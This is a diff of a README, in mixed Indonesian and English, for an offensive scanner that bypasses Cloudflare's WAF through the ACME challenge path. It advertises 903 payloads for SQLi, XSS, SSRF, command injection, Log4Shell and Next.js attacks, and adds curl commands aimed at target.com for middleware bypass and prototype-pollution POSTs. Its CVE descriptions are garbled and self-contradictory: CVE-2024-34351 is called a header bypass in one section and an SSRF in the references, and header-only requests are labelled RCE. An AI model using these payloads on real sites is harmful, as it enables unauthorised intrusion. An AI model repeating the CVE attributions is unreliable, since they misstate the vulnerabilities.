@@ -1,28 +1,44 @@
 # Cloudflare ACME Challenge WAF Bypass Scanner
 
-## 🆕 Update v2.0 (January 2025)
+## 🆕 Update v2.1 (January 2026)
 
 ### New Features:
-- ✨ **Modular Architecture** - Kode dipecah menjadi modul terpisah untuk maintainability
+- ✨ **Modular Payloads Architecture** - 900+ payloads dipecah menjadi 13 file terpisah
+- 🚀 **Next.js RSC RCE** - CVE-2024-34351, CVE-2025-55182, CVE-2025-66478 dengan 150+ payloads
 - 🔄 **Improved OAST** - Better Out-of-band testing dengan multiple Interactsh servers
 - 🎯 **Enhanced Origin IP Discovery** - DNS history via hackertarget.com API
 - 🧠 **Multi-LLM Support** - OpenAI, Anthropic, Ollama, Groq, Gemini
 - 📝 **Auto POC Generation** - Python, Bash, Nuclei, Burp Suite templates
-- ⚡ **Cache Poisoning Detection** - Deteksi vulnerable cache dengan parameter manipulation
-- 🛡️ **Rate Limit Bypass Testing** - 12+ header variations untuk IP spoofing
+- ⚡ **Comprehensive WAF Bypass** - URL encoding, Unicode, null bytes, case manipulation
+- 🛡️ **Rate Limit Bypass Testing** - 100+ header variations untuk IP spoofing
 
 ### Code Structure:
 ```
-├── scanner.py          # Entry point (CLI)
+├── scanner.py              # Entry point (CLI)
 ├── core/
-│   ├── scanner.py      # CloudflareScanner class
-│   ├── oast.py         # OAST client & server
-│   ├── poc_generator.py # Auto POC generation
-│   └── llm_analyzer.py # AI vulnerability analysis
+│   ├── scanner.py          # CloudflareScanner class
+│   ├── oast.py             # OAST client & server
+│   ├── poc_generator.py    # Auto POC generation
+│   └── llm_analyzer.py     # AI vulnerability analysis
 └── utils/
-    ├── config.py       # Configuration loader
-    ├── constants.py    # Banner, user agents
-    └── payloads.py     # All vulnerability payloads
+    ├── config.py           # Configuration loader
+    ├── constants.py        # Banner, user agents
+    ├── payloads.py         # Backward compatibility wrapper
+    └── payloads/           # 🆕 Modular payload structure
+        ├── __init__.py     # Module exports
+        ├── acme.py         # ACME challenge payloads (3)
+        ├── actuator.py     # Spring Boot Actuator (47)
+        ├── cloudflare.py   # CF-specific bypass (55)
+        ├── graphql.py      # GraphQL introspection (30)
+        ├── headers.py      # WAF bypass headers (132)
+        ├── injection.py    # XSS, SQLi, SSTI, CMD (228)
+        ├── log4shell.py    # Log4Shell/JNDI (43)
+        ├── nextjs.py       # Next.js RSC RCE (163)
+        ├── sensitive_paths.py # Admin panels (61)
+        ├── ssrf.py         # SSRF payloads (70)
+        ├── templates.py    # POC templates
+        ├── traversal.py    # Path traversal/LFI (53)
+        └── xxe.py          # XXE payloads (18)
 ```
 
 ---
@@ -69,25 +85,30 @@ This tool is created **ONLY** for:
 | Category | Payloads | Description |
 |----------|----------|-------------|
 | **ACME WAF Bypass** | 3 | Core bypass via /.well-known/acme-challenge/ |
-| **Spring Actuator** | 23 | `..;/` traversal to actuator endpoints |
-| **PHP LFI** | 20 | Local File Inclusion via path traversal |
+| **Spring Actuator** | 47 | `..;/` traversal to actuator endpoints with WAF bypass |
+| **PHP LFI** | 43 | Local File Inclusion via path traversal with encoding bypass |
 | **Next.js SSR** | 9 | Server-side rendering data exposure |
+| **Next.js RSC RCE** | 66 | CVE-2024-34351, CVE-2025-55182, CVE-2025-66478 |
+| **Next.js RSC Headers** | 34 | Middleware bypass headers |
+| **Next.js RSC POST** | 54 | POST payloads dengan berbagai teknik WAF bypass |
 | **Path Traversal** | 10 | Multiple encoding techniques |
-| **CF WAF Bypass** | 21 | URL encoding, unicode, null bytes |
+| **CF WAF Bypass** | 55 | URL encoding, unicode, null bytes, case manipulation |
 | **CF Specific Paths** | 16 | /cdn-cgi/, /.well-known/ paths |
 | **Cache Poisoning** | 8 | X-Forwarded-Host, cache key manipulation |
 | **Host Header Injection** | 11 | Multiple host header variations |
 | **Rate Limit Bypass** | 16 | IP spoofing headers |
-| **Sensitive Paths** | 60+ | Admin, configs, debug via ACME bypass |
-| **GraphQL** | 5 | Introspection via ACME path |
-| **SSRF** | 25 | Server-side request forgery (localhost, cloud metadata) |
-| **XSS** | 17 | Cross-site scripting payloads |
-| **SQLi** | 16 | SQL injection payloads |
-| **XXE** | 4 | XML External Entity |
-| **SSTI** | 10 | Server-side template injection |
-| **Command Injection** | 21 | OS command injection |
-| **Log4Shell/JNDI** | 7 | Log4j vulnerability payloads |
-| **OAST Blind Vuln** | 28+ | SSRF, XSS, XXE, Log4Shell, SSTI |
+| **WAF Bypass Headers** | 102 | Comprehensive header manipulation |
+| **Sensitive Paths** | 61 | Admin, configs, debug via ACME bypass |
+| **GraphQL** | 30 | Introspection via ACME path with WAF bypass |
+| **SSRF** | 70 | Server-side request forgery with encoding bypass |
+| **XSS** | 55 | Cross-site scripting with WAF bypass |
+| **SQLi** | 56 | SQL injection with encoding bypass |
+| **XXE** | 18 | XML External Entity with encoding bypass |
+| **SSTI** | 41 | Server-side template injection with bypass |
+| **Command Injection** | 76 | OS command injection with bypass |
+| **Log4Shell/JNDI** | 43 | Log4j vulnerability payloads with bypass |
+
+**📊 Total: 903 Payloads** with comprehensive WAF bypass techniques
 
 ### Origin IP Discovery Methods
 1. **Response Headers** - X-Served-By, X-Backend-Server, Via, etc.
@@ -220,6 +241,33 @@ python scanner.py -l targets.txt --oast --analyze --poc
 ```
 /.well-known/acme-challenge/{token}/../_next/data/
 /.well-known/acme-challenge/{token}/..;/api/config
+```
+
+### 3.1 Next.js RSC RCE (CVE-2024-34351, CVE-2025-55182, CVE-2025-66478)
+```bash
+# CVE-2024-34351: Middleware bypass with x-middleware-subrequest header
+curl -H "x-middleware-subrequest: 1" https://target.com/_next/server/app/
+curl -H "x-middleware-subrequest: middleware" https://target.com/admin
+
+# CVE-2025-55182: RSC Streaming Response RCE
+curl -H "rsc: 1" -H "Accept: text/x-component" https://target.com/_rsc
+curl -H "next-rsc-flight: 1" -H "rsc: 1" https://target.com/
+
+# CVE-2025-66478: Server Actions Deserialization RCE
+curl -X POST -H "Next-Action: test" -H "Content-Type: application/json" \
+  -d '{"__proto__":{"admin":true}}' https://target.com/
+curl -H "x-server-action: 1" -H "x-action-encrypted: false" https://target.com/
+
+# Server Actions via ACME bypass
+/.well-known/acme-challenge/{token}/../__next_action
+/.well-known/acme-challenge/{token}/../_next/server/pages/api/
+/.well-known/acme-challenge/{token}/../.next/server-reference-manifest.json
+
+# RSC Flight data exposure
+curl -H "rsc: 1" -H "Next-Action: true" https://target.com/
+
+# Source map exposure
+/.well-known/acme-challenge/{token}/../_next/static/chunks/main.js.map
 ```
 
 ### 4. WAF Bypass Encoding
@@ -399,6 +447,11 @@ Ensure you have written permission before performing security testing on any tar
 ## �🔗 References
 - [FearsOff Research](https://fearsoff.org/research/cloudflare-acme)
 - [Cloudflare Blog](https://blog.cloudflare.com/acme-path-vulnerability/)
+- [CVE-2024-34351 - Next.js Server Actions SSRF](https://nvd.nist.gov/vuln/detail/CVE-2024-34351)
+- [CVE-2025-55182 - Next.js RSC Streaming RCE](https://nvd.nist.gov/vuln/detail/CVE-2025-55182)
+- [CVE-2025-66478 - Next.js Server Actions Deserialization RCE](https://nvd.nist.gov/vuln/detail/CVE-2025-66478)
+- [Assetnote - Next.js and the Corrupt Middleware](https://assetnote.io/blog/nextjs-and-the-corrupt-middleware)
+- [CVE-2024-46982 - Next.js Cache Poisoning](https://nvd.nist.gov/vuln/detail/CVE-2024-46982)
 
 ## 📝 License
 MIT License - See LICENSE file for details
